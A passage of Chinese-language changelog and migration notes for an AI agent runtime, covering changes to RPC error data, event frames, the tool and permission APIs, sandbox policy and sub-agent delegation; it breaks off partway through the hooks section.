- **skill 变量 `${AGIX_SKILL_DIR}` 取 SKILL.md 所在目录、`${AGIX_SESSION_ID}` 取调用它的会话**;
  拿不到时原样保留,不再填 daemon 进程的工作目录与环境。

### RPC 客户端

#### 参数严格读

- **每个方法的 `params` 都按声明的类型读,读不进来一律 `INVALID_PARAMS`**,message 为
  "invalid params for <method>: <serde 错误>"。以前不少字段类型不对时当作没给或取缺省,现在报错,例:
  `schedule.create {recurring: "no"}`(以前等于 `true`)、`session.rename {name: 3}`(以前清掉名字)、
  `session.list {include_children: "yes"}`、`session.history {limit: -1}`(超过 500 仍是截断)、
  `project.trust {trusted: "yes"}`、`config.getProvider {include_secrets: "yes"}`、
  `plugin.install {checksum: 3}`、`session.dropMessages {at: [3, "1"]}`(以前悄悄只去掉 3)。缺字段的
  文案统一为 serde 的 "missing field `…`",枚举取值不对的文案是 serde 的枚举错误
  (`config.get` 的 `tier`、`plugin.install` 的 `scope`、`mcp.auth.start` 的 `redirect`、
  `session.updateGoal` 的 `action` 等)。错误码不变的地方只是 message 变了;不要解析 message。
- **个别反向的变化:** `config.setProvider {config: null}` 以前报 "config must be a JSON object",
  现在当作没给;无参方法忽略传入的任何 `params`,缺省的 `params` 当作 `{}`。
- **未启用插件子系统时,类型不对的 `plugin.*` 参数先于 `PLUGINS_DISABLED` 被拒。**
- `session.options` 仍是宽松读(未知字段进 `ignored_options`,`strict` 时报错),`run_turn` 的
  `attachments` 里坏条目照旧丢弃。

#### `SESSION_BUSY`

- **`error.data` 多了 `reason`。** 取值 `turn_running`(必带 `current_turn_id`)、`rebuilding`、
  `background_tasks`(另带 `running_task_ids`)、`previous_engine`、`context_operation`,说的是会话
  此刻在忙什么,不是哪个方法被拒(协议文档 §9.1)。以前只有 `{session_id, current_turn_id}`。要改的:
  按 `reason` 决定等多久、要不要重试;不认识的取值按"稍后再试"处理,以后可能增加。
- **以前不带 `data` 的几处 `SESSION_BUSY` 现在带。** 重建时旧引擎未停、上下文请求撞上正在跑的
  turn、`session.setGoal` / `session.startAgent` / 要先恢复会话的上下文请求在旧引擎未停时
  (`reason: "previous_engine"`,`current_turn_id: null`)。以前靠"没有 `data`"区分来源的,改读 `reason`。
- **`message` 文本变了。** `session.setPrompt` / 换厂商的 `session.setModel` 因旧引擎没停下而失败
  时,message 由 "session is busy" 改为 "session `…` could not be brought back: … is still stopping on
  its previous engine; try again once it has";`session.inspectContext` / `dropMessages` /
  `editMessage` 在有回合时由 "session `…` is running turn `…`" 改为 "session is busy"。认错误码与
  `reason`。
- **会话重建期间的拒绝。** `session.setModel`(不换厂商)与 `session.inspectContext` /
  `dropMessages` / `editMessage` 在重建期间返回 `SESSION_BUSY`(`reason: "rebuilding"`)。以前前者
  改了规格并发给正在停止的旧引擎,后者报 `ENGINE_ERROR`。`on_busy: "steer"` 的 `session.run_turn` 在
  重建期间等重建结束,不再 steer 进正在停止的旧引擎。
- **上下文请求独占会话。** `inspectContext` / `dropMessages` / `editMessage` 从检查到答复都占着会话:
  期间到达的 `run_turn{on_busy:"reject"}`、`setModel`、`setPrompt`、另一个上下文请求报
  `SESSION_BUSY`(`reason: "context_operation"`),`run_turn{on_busy:"queue"}` 等它答完。

#### `ENGINE_ERROR` 与 `error` 帧

- **`ENGINE_ERROR` 带 `data: {kind, retryable, retry_after_ms, side_effects}`,四项总在。** `kind` 的
  取值与各自的 `retryable` 见协议文档 §9.1;`side_effects` 为真表示这一轮里已经跑过工具。message 统一
  为 "<kind>: <描述>",以前的 "turn_error: model error: failed to stream model response: …" 变成如
  "overloaded: overloaded (HTTP 529)";`engine_stopped`、`engine_unreachable` 的 message 也加了前缀。
  要改的:按 `data.retryable` / `retry_after_ms` 决定是否、何时重发,不再解析 message。
- **`error` 帧的 `code` 不再是 `turn_error`**,改为同一组 `kind` 值,并多了 `retryable`、
  `retry_after_ms`。旁观的订阅者收到的 `error` 帧带同样的 `kind`、`retryable`、`retry_after_ms`(没有 `side_effects`)。
- **`kind` 多了 `persist_failed`**(`setPrompt`、换厂商的 `setModel` 重建前补写日志失败,可重试)与
  `internal`(回合驱动 panic)。
- **处理请求时 panic 回 `INTERNAL_ERROR`(-32603)**,message 为 "internal error while serving
  `<method>`",连接与其它请求照常。以前没有响应、客户端一直等。release 构建是 `panic = "abort"`,
  不适用。

#### 事件帧

- **新帧 `model_retry {step, attempt, delay_ms, reason}`**:流开始之后的失败要原样重发前发出,之后
  同一 `step` 再发一次 `step_start`。
- **新帧 `prompt_resolved {prompt_id, resolution, reason?}`**:`resolution` 为 `answered` 或 `withdrawn`;
  `withdrawn` 时 `reason` 为 `timed_out`(超时没人答)或 `cancelled`(回合取消或结束、会话关闭)。回答与
  超时同时到时只有先到的一方算数,不会既执行回答又报撤回。每个提问至多一帧,推给全部订阅者(包括答题的连接),回合内带
  `turn_id`,空闲时为 `null`。`session.subscribe` 的 `pending_prompts` 在这帧之后才去掉那个提问(以前
  `respondToPrompt` 一到就去掉)。要改的:多个连接同看一个会话的,收到它就收起提问界面。
- **`turn_complete` 多一个总是出现的 `persisted`**,为 `false` 时日志没写全(见"部署"的会话与日志)。
- **`session.setModel` 之后不再有 "model set to …" 的 `system` 帧**;选择记在会话上,下一轮开头生效。
- **`daemon.event` 的 `session_evicted` 多一个 `reason` 取值 `engine_fault`**:回合驱动 panic 后这个
  引擎不再可用,会话移出内存,下一轮冷恢复。
- **嵌套仓库被检测到时发 `notification` 帧**(见"部署"的沙箱与执行)。
- **`subagent_progress.event` 里嵌套的事件走与外层同一个投影。** 嵌套事件不再带 `turn_id`,`kind` 与
  外层一致(`compact`、`prompt`)。投影为空的嵌套事件整帧不发,以前会发的有:子 Agent 的
  `system_init`、子 Agent 的 `system`,以及孙 Agent 的 `agent_spawned` 与 `agent_completed`(含
  `outcome`)。要改的:靠嵌套 `agent_completed.outcome` 得知孙 Agent 结局的,改读子 Agent 发起它的
  那次 `Agent` 调用的嵌套 `tool_result`(同一 `agent_label` 下,`id` 与那次嵌套 `tool_use` 的相同):
  `is_error: true` 即以前的 `failed`,否则 `content` 是孙 Agent 的回答;以前的 `cancelled` 在
  `tool_result` 上与 `completed` 分不开。孙 Agent 的开始看同一次调用的嵌套 `tool_use`。
- **子 Agent 的 `agent_spawned` 带上父会话 id**(fork skill、agent hook、团队成员以前为空串);团队
  成员的 `agent_*` 遥测 `agent_id` 是成员的会话 id(以前是 `team_id` 与成员名),由 agents 记、带
  `model`;`team_stage_complete` 遥测的 `session_id` 与轮次取发起 `TeamCreate` 的会话(以前是
  `team_id` 与 0)。

#### 会话、场景与诊断

- **`session.get` 与 `session.export` 清单的 `turn_state` 多两个取值**:`rebuilding`(原地重建中)、
  `operating`(被上下文请求独占);以前这两种都报 `idle`,宿主照着放开发送键却得到 `SESSION_BUSY`。
- **`daemon.doctor` 的结果多一个总是出现的 `runtime` 段**:每个在内存的会话报 `phase`、`generation`、
  `turn {turn_id, running_ms}`(只在 running 时)、`log {behind}`、`last_failure {kind}`,另有
  `stopping_engines`。只报数,不判阈值。另见"部署"里新增的 `sandbox.strict_profile` 检查。
- **`scene.list` / `scene.describe` 的 `tools.allowed`、`tools.disallowed` 是 pattern 的规范写法**:
  `mcp__<server>` 写成 `mcp__<server>__*`。
- **`session.interrupt` 在回合已占住、消息还没发给引擎时有效。** 以前这段窗口里它返回
  `interrupted: false`、回合照跑;现在返回 `true`,这一轮以 `stop_reason: "cancelled"` 结束、不调用模型。
- **发起回合的那次调用被取消(连接断开、请求被丢下),回合照样跑完、还槽。** 以前会话停在
  running,之后排队的回合永远等下去。
- **`on_busy: "steer"` 只在消息真交给了正在跑的回合时答 `Steered`。** 引擎 5 秒内没答复时同一条消息
  既进正在跑的回合、又排成下一轮的情形没有了;会话正被关闭或停下时按排队处理,会话随后不在表里就
  报会话不存在。
- **`session.close` 等进行中的重建或恢复结束后再关**,不再被随后完成的重建复活。会话被关闭后用同一
  id 恢复,旧回合迟到的收尾不再写进新会话(`context`、自动命名)。
- **`scene.deactivate` 与建会话不再竞争。** 停用按内存里会话的场景判断并在会话表锁下完成;正在建的
  会话插表时场景已停用则以 `SCENE_NOT_FOUND`(-32004)失败(池内是 `PoolError::SceneNotActive`)。挡路的会话 id 按字典序列出。
- **`session.startAgent`** 的 `permission_rules` 只取其中的 deny;会话没有装配子 Agent 时报
  `INVALID_REQUEST`(协议文档 §9)。参数读不进来时 message 由 "session.startAgent: <serde 错误>" 改为
  统一的 "invalid params for session.startAgent: …"。
- **`session.setGoal` / `updateGoal` 撞上已终态的侧链**,message 改为与 `session.resume` 相同的
  "sidechain session already ran to completion",`data` 同 `SIDECHAIN_TERMINAL`。
- **`session.run_turn` 的参数校验(缺 `message`、`turn_id` 形式、`on_busy`)先于场景检查。** 两者同时
  不满足时,以前报 `SCENE_MISMATCH`,现在报 `INVALID_PARAMS`。
- **权限提问的文本**见"部署"的权限判定:提示语用工具自己的问句;子 Agent 与程序发起的调用的拒绝文本
  变了;`permission_rules` 里 `match: "exact"` 的条目见协议文档 §4.7。

### 嵌入方

`base::event::AgentEvent` 是封闭的枚举(理由见 `extension_points.md` 的"事件去哪"):这一版加了
`ModelRetry`、`PromptResolved` 两个变体,`Error`、`TurnComplete` 的字段也变了,在 Rust 里穷尽
`match` 它的代码要跟着改。另有一批引擎产出、宿主去 `match` 的枚举加了 `#[non_exhaustive]`,见本节末。

#### 路径去向

更早各节里出现、这一版已删除或改名的路径:

| 以前 | 现在 |
|---|---|
| `base::interface::{event,memory,prompt,rules,settings}::*` | `base::{event,memory,prompt,rules,settings}::*`(那五个重导出本来标着 `#[deprecated]`,但加在 `pub use` 上不触发警告;`base::interface::memory::MemoryStore` 等同理) |
| `base::context::PromptCtx` | `base::tool::PromptContext` |
| `base::frozen::git::{EngineGit, GitSandbox, ENGINE_GIT_OPTIONS}` | `base::engine_exec::{EngineExec, Confinement, GitAccess, Admission, EngineExecError, admit_git, read_head, ENGINE_GIT_OPTIONS}` |
| `platform::env`(曾是 `base::interface::exec::env` 的再导出) | `platform::env` 现在是 `platform` 自己的模块,只有 `apply_subprocess_env(&SubprocessEnv, &mut tokio::process::Command)`;策略类型仍在 `base::interface::exec::env`(也可写 `base::interface::exec::{SubprocessEnv, SubprocessEnvMode, EnvPlan}`),`hold_back_credential`、`is_engine_credential` 留在原处 |
| `platform::SubprocessEnv`、`platform::SubprocessEnvMode` | 删除,改用 `base::interface::exec::{SubprocessEnv, SubprocessEnvMode}`;0.3.11 一节"整体替换也编得过"的说法不再成立 |
| `SubprocessEnv::apply(&mut Command)` | `platform::apply_subprocess_env`;`base` 里是 `SubprocessEnv::resolve(host) -> EnvPlan`(纯判定) |
| `tools` 的 `exec_capture`(crate 私有) | `base::interface::exec::capture(&dyn Process, spec, cancel) -> Captured` |
| `tools::bash::{engine_git, engine_git_for}` | `tools::bash::{engine_exec, engine_exec_for}`,后者参数 `(settings, &ExecProviders, sandbox_disabled, session_id, ProjectTrust)` |
| `runtime::turn` 的 `engine_git_from` | `engine_exec_from(config, exec, session_id, trust)` |
| `tools::deferred::{DeferredTool, apply_deferred_policy}` | 删除,见"Tool 实现方" |
| `assembly::session_pool::{RpcError, ResumeError, SetModelError}`(含 0.3.7 的 `SetModelError::Busy`、0.3.11 的 `ResumeError::Busy`) | `PoolError`,见"会话池" |
| `assembly::rpc_schema::{rpc_json_schema, session_event_kinds, daemon_event_kinds, method_names, error_codes}` | `assembly::server::schema::{rpc_json_schema, session_event_kinds, daemon_event_kinds}`;方法表是 `assembly::server::methods()`,错误码是 `rpc::ErrorCode::ALL` |
| `assembly::rpc::StreamFrame` | `rpc::DaemonEventFrame`(params 为池的 `DaemonEvent` 或 server 的 `ServerDaemonEvent`) |
| `assembly::rpc::{SessionOptions, RecorderOptions, ClockOptions, TelemetryOptions}` | `assembly::session_pool::api::{SessionOptions, RecorderOptions, ClockOptions, TelemetryOptions}`;宽松读法(`read_options` 等)留在 `rpc` |
| `rpc::{PROMPT_TYPE_PERMISSION, PROMPT_TYPE_QUESTION}` | `session_pool::api::AskKind` |
| `assembly::export::ArchiveFormat` | `assembly::session_pool::api::ArchiveFormat` |
| `assembly::AllowAllPermission`、`daemon::AllowAllPermission` | 删除,见"权限" |
| `Assembly.permission` | `Assembly.host_policy`,见"权限" |
| `Assembly` 的 `mcp_credential_store`、`mcp_oauth_client`、`mcp_enterprise_idp`、`mcp_policy` | `Assembly.mcp: McpOptions`(字段去掉 `mcp_` 前缀),类型在 `assembly::assemble::McpOptions` |
| `SessionManager::set_token_counter` | `SessionManager::with_token_counter(self, counter)`,另有 `token_counter(&self)` |
| `base::rules::{default_rule_sources, discover_rules, discover_rules_from, build_rules_prompt}` | `RuleTiers::{new, for_paths}` 与 `render_rules_prompt(&[RuleEntry])` |
| `AgentTool` 的全部构造与 `with_*` / `set_*`(含 0.3.11 的 `with_process_groups`) | 删除;子 Agent 只经 `AgentsModule` 装配,见"委派" |
| `base::interface::agent_spawner::*`(`AgentSpawner`、`SpawnRequest`、`SpawnMode`、`AgentRequest`、`StartAgentError`、`StartedAgent`、`TeamSeat`) | `base::interface::delegate::*`,见"委派" |
| `agents::spawner::RuntimeAgentSpawner` | 删除,用 `Agent::delegator()` |
| `runtime::hook_executors::AgentSpawnerHookExecutor` | `DelegatorHookExecutor::new(Arc<dyn Delegator>)` |
| `permissions::gate::{PermissionGate, ManagedPolicy}`、`permissions::rule_set_permission::RuleSetPermission`、`permissions::error::GateError` | `permissions::policy::{Policy, ManagedLayer}`,见"权限" |
| `base::interface::scene::Scene` | `base::interface::scene::{SceneSpec, ScenePrompt}`,见"场景" |
| `scene::code::CodeScene`、`scene::harnix::HarnixScene`、`scene::mini::MiniScene`、`scene::DeclarativeScene` | `scene::code::spec(Interaction)`、`scene::harnix::spec()`、`scene::mini::spec()`、`scene::DeclaredScene`;按 id 取 `scene::builtin(id)` |
| `base::interface::script_adapters::*`、`base::interface::script::{ScriptCarrier, PromptAssemblyScript}` | `script_host::adapters::*`、`script_host::carrier::ScriptCarrier`(`PromptAssemblyScript` 在 `script_host::adapters`) |
| `compaction::compact` 重导出的 `Aging` 一族 | 只从 `compaction::aging` 导出 |
| `base::settings::{PermissionAction, PermissionRule}` | `base::permission::RuleBehavior`、`base::settings::PermissionRuleEntry` |
| `base::tool::{PermissionDecision, PermissionContentKind, ToolPermissionSpec}`、`base::permission::{PermissionDecision, DecisionReason, ValidationResult}` | 删除,见"Tool 实现方";`Tool` 用的是 `base::tool::ValidationResult` |
| `SessionPool::drop_connection(ConnectionId)`(`assembly::server` 上的同名方法仍在) | `SessionPool::drop_watcher(WatcherId)` |
| `tests/` 里的 `dependency_direction.rs`、`one_assembly.rs`、`carrier_invariants.rs`、`home_is_never_discovered.rs`、`hook_event_wiring.rs` | `tests/guards/tests/` 下的各守卫,见"测试与守卫" |

#### Tool 实现方

0.3.11 一节说"旧方法仍然可用,没有 deprecate""`spec()` 缺省从旧方法读出""包装器要转发
`accept_edits_allows`",这几句都不再成立。

- **`Tool` 正好 9 个方法:`name`、`description`、`spec`、`input_schema`、`guide`、`call_traits`、
  `permission_facts`、`validate_input`、`call`。** `description()` 与 `spec()` 必须实现(`spec()` 可以只是
  `ToolSpec::new()`)。写法见 `extension_points.md` 的"实现一个工具"。
- **权限面只剩 `permission_facts(input, ctx) -> PermissionFacts`。** `check_permissions`、
  `accept_edits_allows`、`permission_match_content` 删除:工具报这次调用的事实(`Subject` 主体、`Reach`
  可达范围、`Runs` 是否起命令、要问时的问句),判定归引擎。缺省是 `PermissionFacts::unknown()`,即什么都
  不声称,**每次调用都会被问,无人值守时拒绝**。原来 `check_permissions` 返回 allow 的,多半写成
  `Reach::SessionOnly`;返回 ask(问句)的写成 `Reach::Unknown` 加问句;`permission_match_content` 给出的
  内容改成对应的 `Subject`。
- **删除的能力方法与改法。** `is_read_only`、`is_concurrency_safe`、`is_destructive`、
  `callable_from_code`、`code_result`、`needs_dispatch`、`short_description`:常量答案写进 `spec()`
  (`ToolSpec::new().read_only(true)…`),看输入才知道的覆写 `call_traits(input) -> CallTraits`。
  `prompt()`、`detailed_prompt()` 改为 `async fn guide(&self, ctx) -> Option<String>`。`source`、
  `is_enabled`、`strict`、`is_dynamic`、`is_direct`、`affected_paths`、`interrupt_behavior`、
  `is_deferred`、`full_input_schema`、`prompt_fragment` 直接删掉(`InterruptBehavior` 一并删除)。
  以前没写 `description()` 的实现显式返回空串。
- **`fn input_schema(&self)` 改为 `fn input_schema(&self, style: PathStyle)`,`input_schema_for` 删除。**
- **`ToolSpec` 重排。** `read_only` / `concurrency_safe` / `destructive` → `spec.traits.*`;`source: String`
  → `origin: ToolOrigin`(`Builtin`、`Mcp { server }`、`Plugin { name }`);对模式的立场是
  `.stance(ModeStance::Coordination | ModeStance::LeavesPlan)`,取代 `permission_content_kind` /
  `self_allow_overrides_mode` / `leaves_plan_mode`,`spec.permission` 整个删除;去掉 `name`、
  `description`、`enabled`、`interrupt_behavior`、`strict`、`dynamic`、`direct`、`deferred`;
  `ToolSpec::defaults_for` 删除。`ToolSpec`、`CallTraits`、`ToolOrigin` 是 `#[non_exhaustive]`:在
  `base` 之外用 `ToolSpec::new()` 加链式 setter 构造,对 `ToolOrigin` 做 `match` 要带通配分支。
- **`ToolContext` 多了 `confinement`(会话的沙箱兑现程度)、`attendance`(有没有人可问)、
  `approval`(这次放行的依据与执行 profile,`Option`)、`turn: Arc<TurnScope>`(回合来源与结构化输出)**;
  `dangerously_disable_sandbox` 删除,沙箱关没关只看 `config.dangerously_disable_sandbox`。用结构体字面
  量构造 `ToolContext` 的要补上。新增的构造函数:`ToolResult::{blocks, with_error, with_structured,
  with_mcp_meta, with_new_messages}`、`ProgressUpdate::{with_progress, with_total}`、`ToolDef::new`、
  `StartedAgent::new`、`TokenBudget::new`、`ExecutionParams::new`、`ModuleSurface::new`、
  `ReminderContext::new`,`ScenePromptContext` 派生 `Default`。
- **外部内容围栏由 runtime 加。** `Read` 去掉自己的围栏,`WebFetch` 不再自己加;不经 runtime 分发、
  直接调用工具的嵌入方拿到的 `Read`、`WebFetch` 结果不再带围栏,需要时自己调
  `tools::external_content`。
- **包装另一个 `Tool` 的包装器**只要转发上面 9 个方法;`DeferredTool` 已删除。工具的字段里不能再含
  `dyn Tool`(守卫 A3)。
- **延迟是会话属性。** 名单是 `EngineConfig::deferred_tools`,`Builder::build` 按场景填写;要判断
  一个工具在会话里是否延迟,读 `ToolContext.config.deferred_tools` 或 `Agent::deferred_tools()`。延迟的
  MCP 工具在 `ToolDef.source` 上报 `mcp:<server>`。
- **`ToolRegistry`。** `all`、`find`、`has_direct_tool` 删除,用 `list`、`get`;实现 `ToolRegistry` 必须
  提供 `list`、`get`、`register`、`replace`、`remove`。`LayeredToolRegistry` 改为持有隐藏名集合。
- **插件工具来源。** `ToolOrigin::Plugin { name }` 让 `inspectContext` 里插件工具的来源报 `plugin:<name>`。

#### 权限

- **`Permission` 拆成 `PermissionPolicy`(`decide(&PermissionRequest)`)与 `PermissionGrants`
  (`grant(Grant)`、`clear(GrantScope)`)。** `PermissionSet { policy, grants }` 打包两半,`grants` 是
  `Option<Arc<dyn PermissionGrants>>`:`PermissionSet::of(x)` 收同时实现两个 trait 的值,
  `PermissionSet::without_grants(policy)` 的 `grants` 为 `None`(提示不提供"总是允许")。`GrantScope` 是
  `Turn`、`Session`、`Project`;`Grant` 新增 `matching: GrantMatch { Pattern, Exact }`,`Grant::new` 按 scope
  定(Turn 是 Pattern,其余是 Exact)。`add_temporary_allow`、`clear_temporary_allows`、
  `add_persistent_allow`、`NoGrants`、`GrantError::NotKept` 删除。
- **引擎的判定是 `permissions::policy::Policy`。** `RuleSetPermission`、`PermissionGate`、
  `ManagedPolicy`、`GateError` 删除。`Policy::new(RuleSet)` / `empty()` / `from_settings(&LoadedSettings,
  extra_rules)`,再按需 `with_managed(ManagedLayer)`、`with_sandbox`、`with_local_settings_file`、
  `with_host`、`with_no_one_to_ask`;`rules` / `add_rules` / `remove_rules_by_source` 照旧。`Policy::decide`
  不校验输入,直接调它的先 `validate_input`。
- **`PermissionRequest::new(tool_name, tool, input, facts, ctx, session)`**:`facts`(`ToolFacts::gather`
  收集)、`ctx` 必填,`hook` 缺省 `HookAnswer::None`、`attendance` 缺省取 `ctx.attendance`,用
  `with_hook` / `with_attendance` 覆盖;`cwd`、`session_id` 删除,从 `req.ctx` 读。`check_for_delegate`、
  `bind_tool_registry`、`bind_session_state` 删除。`delegate` 是 `Option<Delegate>`(`Delegate::of(session)`
  是无附加规则的写法),`Delegate.rules` 里的 deny 在任何模式下都拒,allow 是委派的授予层,只回答模式
  本来要问的那一问。
- **`PermissionOutcome` 变形。** `Permit { basis, profile, obligations }`、`Deny { reason: Reason }`、
  `Prompt { prompt_id, message, paths, reason, answerable }`;`Answerable::PersonOnly` 取代
  `managed: bool`;新增 `Basis`、`Answerable`、`Reason`、`Stage`、`ExecProfile`、`Obligations`、
  `Approval` 与 `PermissionOutcome::{deny, prompt, is_permit}`。
- **宿主自己的策略是 `Policy` 里的一层规则,不再替换引擎的判定。** `Assembly.permission:
  Option<Arc<dyn Permission>>` 改为 `Assembly.host_policy: Option<Arc<dyn PermissionPolicy>>`:它的 deny 在
  任何模式下生效(bypass 下也是),Prompt 是一条 ask 规则,Permit 只等于一条 allow 规则(来源
  `RuleSource::Host`,序列化为 `"host"`),凭据、deny / ask 规则、模式硬拒照样在它前面。所以宿主的
  "全部放行"不再跳过凭据检查与计划模式,在 `default` 模式下则会放行原本要问的调用。
  `AllowAllPermission` 删除。
- **`runtime::agent::Builder` 不给 `.permission(..)` 时按设置判定,不再全部放行;** 也不给
  `.elicitation(..)` 时要问的调用一律拒绝。只靠事件通道答 `PermissionPrompt` 的嵌入方显式传
  `.permission(PermissionSet::of(Arc::new(Policy::from_settings(..))))`。经 `Builder::permission` 自带
  `PermissionPolicy` 的,收到的请求带 `facts`、`ctx`、`hook`、`attendance`,hook 拦截与"没人可问"要它
  自己处理(runtime 不再替它把 hook approve 的 Prompt 改成放行),或者改用引擎的 `Policy` 加 `with_host`。
- **周边签名。** `Agent::permission()` 返回 `&PermissionSet`;`SkillCatalog::expand`、
  `CommandRegistry::run_prompt_command` 收 `&dyn PermissionPolicy`;`SkillTool::with_permission`、
  `skills::tool::register` 收 `PermissionSet`;`ChannelElicitation::authorization_options(keeps_grants)`
  多一个参数;`Elicitation` 新增带缺省实现的 `can_clarify()`,`Builder::elicitation` 设了一个返回
  `false` 的实现时会话不提供 `AskUserQuestion`;`Elicitation` 新增带缺省实现的 `ask_within(..)`,超时由
  提问自己处理(谁先把提问从待答表取走谁算数),自己实现 `Elicitation` 又要单一胜者语义的覆盖它;`ruleset::literal_rule_content` 删除,
  `settings_patch::build_rule_string` 不再转义 URL,新增 `settings_patch::append_exact_allow`、
  `rule::exact_allows_from`;`settings::PermissionRuleEntry` 新增 `match` 字段。`runtime` 不再依赖
  `permissions`。
- **`PermissionMode` 只剩 `base::permission::PermissionMode` 一份**,`base::settings::PermissionMode` 是它
  的重导出;两者互转的 `.into()` 直接去掉。
- **`EngineConfig.project_untrusted: bool` 换成 `project_trust: ProjectTrust`**(`NoProject` / `Trusted`
  / `Untrusted`,`is_untrusted()`)。
- **遥测。** `PermissionDecisionOutcome::Ask` 删除,新增 `UserAllow`;`PermissionDecisionPayload` 新增
  `basis`、`stage`,记的是最终结论。
- **`Credentials` 由敏感路径登记表取代。** `base::paths::Credentials` 删除,改为
  `base::paths::sensitive`:`CREDENTIALS` 表与 `SensitivePaths`(按会话的状态目录与项目解析一次,
  `is_credential` 判一条路径,`credential_locations` 给沙箱后端)。`ENGINE_CONFIG_*`、
  `PROJECT_ENGINE_CONFIG_DIRS`、`PROJECT_WORKTREES_DIR`、`STATE_ROOT_*` 搬进 `sensitive`,仍可从
  `base::paths` 引用;`CREDENTIAL_DIR_NAMES` 改为函数 `credential_dir_names()`;`STATE_ROOT_TOKEN_DIRS`、
  `DAEMON_TOKEN_DIRS`、`STATE_ROOT_KEY_FILE_STEMS`、`PROJECT_KEY_FILES`、`is_state_root_key_file`、
  `is_project_key_file` 删除。`SandboxPolicyConfig.state_root`、`SandboxSettings.state_root` 换成
  `paths: Arc<SensitivePaths>`,`SandboxPolicy.known_scenes` 删除。`PromptFiles` 删掉 `Default` 与
  `new(None, ..)`,改用 `PromptFiles::unscoped()` 或 `SensitivePaths::prompt_files_within(dir)`。
- **沙箱策略。** `SandboxPolicy` 新增 `read: ReadScope`(`Everything` / `Only`)、`env: EnvScope`
  (`Session` / `Minimal`)与 `egress: Option<ProxyEndpoint>`(出网代理只定了接口
  `base::interface::exec::egress`,目前恒为 `None`),`SandboxPolicy::strict(可读根, TMPDIR)` 给出严格
  profile;`ProcessSpec` 新增 `env_scope`;`ConfinementReport` 新增 `strict`、`session_unmet`、`strict_unmet`
  (兑现不了的逐条明细),不再是 `Copy`。用结构体字面量构造
  `SandboxPolicy`、`ProcessSpec` 的要补上(或用 `ProcessSpec::new` / `..Default::default()`)。
  `tools::bash::confine_shell` 返回 `ProcessSpec`(不再是 `Result`);新增
  `tools::bash::{confinement_report, strict_sandbox_policy}`。`tools::security::check_write_permission`
  删除,改用 `tools::security::{write_facts, read_facts}`。
- **`FileSystem` 新增带缺省实现的 `rename`**(缺省返回失败、什么都不动;本机与内存实现已有),转发型
  替身要转发它。`tools::nested_repos::quarantine(ctx, git_dir) -> Result<PathBuf, ExecError>` 经会话的文件
  系统改名;新增 `tools::nested_repos::settle_unasked`(没人可问时按许可移开危险仓库)。`skills` 改为正常
  依赖 `tools`。
- **`LocalProcess::spawn` 的取消令牌生效**:句柄存活期间令牌一取消,向整个进程组发 SIGTERM,宽限期后
  SIGKILL。以前只靠调用方自己 kill 或丢弃句柄。

#### 委派

委派只剩一条路:`base::interface::delegate::Delegator`。设计见 `ARCHITECTURE.md` §3.4,用法见
`extension_points.md` 的"委派"。

- **`AgentSpawner` 一族删除。** `Delegator::delegate(DelegateRequest) -> Result<Delegated,
  DelegateError>` 与 `stop_member(&TeamSeat)` 取代它;`DelegateRequest` 是 `#[non_exhaustive]`,
  `DelegateRequest::new(prompt, mode, stops_with)` 给出什么都不收窄的缺省,再逐字段改;`tools` 是 `ToolSelector`、`deny_rules` 只收 deny、`grants` 是本轮授权、
  `called_from` 是归属的回合与 `tool_use_id`、`asks` 定要不要问人。`DelegateMode` 是 `Wait`、
  `Background { notify_parent }`、`TeamMember { seat, permission_mode, lifetime }`、
  `Host { notify_parent }`、`Hook { judged_session }`,**没有 `#[non_exhaustive]`**(引擎内的唯一分派对
  它穷尽 `match`),以后加模式算破坏性变化。结果按 `DelegateOutcome` / `DelegateEnd` 报
  (`Completed`、`CutShort`、`Failed`、`Cancelled`),不再折叠成文本。`DelegateError` 是
  `#[non_exhaustive]`,新增 `NotJudged`(拒绝给 hook agent 再派裁判)。
- **模块。** `SessionContext::provide_agent_spawner` / `agent_spawner`、`Agent::agent_spawner()` 删除,
  改用 `SessionContext::provide_delegator` / `delegator()` 与 `Agent::delegator()`。嵌入方自己写的模块要让
  fork skill 与 `session.startAgent` 生效,须在 skills 模块之前 `provide_delegator`。
- **宿主契约一次继承。** `runtime::agent::HostContracts` 收齐宿主为本机、本部署给出的答案(执行层、
  计数器、规则、环境、权限、日志存储、遥测、任务路由、场景表、记忆存储与召回、指令来源、插件、模块,
  以及 tool / prompt middleware、结果变换、模型拦截、恢复策略、compactor),`Builder::inherit(HostContracts)`
  是子会话接收它的唯一入口。`SessionContext` 去掉 `exec`、`token_counter`、`rules`、`history_store`、
  `telemetry`、`task_router`、`delegate_plugins`、`modules`、`permission`、`scene_registry`、
  `instruction_file`、`plugin_tools`、`process_groups`,改为 `host: &HostContracts`,模块读
  `cx.host.<字段>`。
- **`AgentTool` 只能经 `AgentsModule` 用。** 它的构造、`with_parent_tools`、`with_shared_agent_types`、
  `with_settings`、`with_subagent_slots`、`with_depth`、`with_exec`、`with_modules`、`with_task_router` 等
  `with_*` 与全部 `set_*` 删除;`agents::agent_tool` 仍导出 `SubagentSlots` 与
  `DEFAULT_MAX_CONCURRENT_SUBAGENTS`。
- **工具收窄。** `Builder::contributed_tool_filter` 与 `runtime::agent::ToolFilter` 删除,改用
  `Builder::tool_selector(ToolSelector)`;子会话的工具由场景的工具面 ∧ 委派选择器 ∧ 插件放行一处决定。
  `base::interface::tool_selector::{ToolSelector, ToolPattern}` 是新的选择器类型。
- **团队。** `MemberLifetime::Stage` 多一个 `stage: String`;`Coordinator` 去掉 `set_event_sender`、
  `set_telemetry_handle`;`DefaultCoordinator::with_agent_spawner` 改为 `with_delegator(Arc<dyn Delegator>)`,
  新增 `with_events`、`with_telemetry`;`TeamCreateTool::new(model, config, Box<dyn Coordinator>)`,
  `with_spawner`、`set_event_sender`、`set_telemetry_handle` 删除;`OrchestrateRequest` 去掉
  `parent_tools`、`sub_tools`;`aggregate` 多一个 `&CancellationToken`;`persist::TeamEvent::MemberCompleted`
  多 `cancelled`;新增 `TeamRegistry::update_recorded_member_lifecycle`。
- **skills。** `SkillTool::with_spawner` 改为 `with_delegator(Arc<dyn Delegator>)`;`skills::tool::register`
  第四个参数改为 `Option<Arc<dyn Delegator>>`。
- **assembly。** `StartAgentParams::into_request` 返回 `DelegateRequest`;`SessionPool::start_agent` 收
  `DelegateRequest`,`mode` 不是 `Host` 时回 `InvalidRequest`。
- **`base::context::session::TaskLease`**:构造即登记任务,`conclude(status, notice)` 收尾,未收尾就被丢下的记为
  `Cancelled`。委派任务一律登记在父会话的 `SessionState` 上。

#### hooks

- **`HookRunner::run(event, input, stop: &CancellationToken)`**;`run_elicitation` /
